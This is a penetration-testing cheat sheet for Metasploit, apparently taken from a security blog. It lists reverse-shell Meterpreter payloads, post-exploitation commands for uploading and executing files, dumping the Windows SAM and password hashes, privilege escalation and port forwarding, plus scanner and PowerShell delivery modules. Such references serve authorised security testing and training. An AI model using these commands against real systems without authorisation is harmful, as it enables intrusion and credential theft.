# Metasploit [[36]]

### Meterpreter Payloads

    set payload windows/meterpreter/reverse_tcp     # Windows reverse tcp payload
    set payload windows/vncinject/reverse_tcp       # Meterpreter Windows VNC Payload
    set ViewOnly false
    set payload linux/meterpreter/reverse_tcp       # Meterpreter Linux Reverse Payload
    
### Meterpreter Cheat Sheet

    upload file c:\\windows                  # Meterpreter upload file to Windows target
    download c:\\windows\\repair\\sam /tmp   # Meterpreter download file from Windows target
    download c:\\windows\\repair\\sam /tmp   # Meterpreter download file from Windows target
    execute -f c:\\windows\temp\exploit.exe  # Meterpreter run .exe on target - handy for executing uploaded exploits
    execute -f cmd -c                        # Creates new channel with cmd shell
    ps                                       # Meterpreter show processes
    shell                                    # Meterpreter get shell on the target
    getsystem                                # Meterpreter attempts priviledge escalation on the target
    hashdump                                 # Meterpreter attempts to dump the hashes on the target
    portfwd add –l 3389 –p 3389 –r target    # Meterpreter create port forward to target machine
    portfwd delete –l 3389 –p 3389 –r target # Meterpreter delete port forward

### Auxilary Metasploit Modules

    use auxiliary/scanner/http/dir_scanner      # Metasploit HTTP directory scanner
    use auxiliary/scanner/http/jboss_vulnscan   # Metasploit JBOSS vulnerability scanner
    use auxiliary/scanner/mssql/mssql_login     # Metasploit MSSQL Credential Scanner
    use auxiliary/scanner/mysql/mysql_version   # Metasploit MSSQL Version Scanner
    use auxiliary/scanner/oracle/oracle_login   # Metasploit Oracle Login Module

### Metasploit Powershell Modules

    use exploit/multi/script/web_delivery          # Metasploit powershell payload delivery module
    post/windows/manage/powershell/exec_powershell # Metasploit upload and run powershell script through a session
    use exploit/multi/http/jboss_maindeployer      # Metasploit JBOSS deploy
    use exploit/windows/mssql/mssql_payload        # Metasploit MSSQL payload

[36]: <https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#metasploit>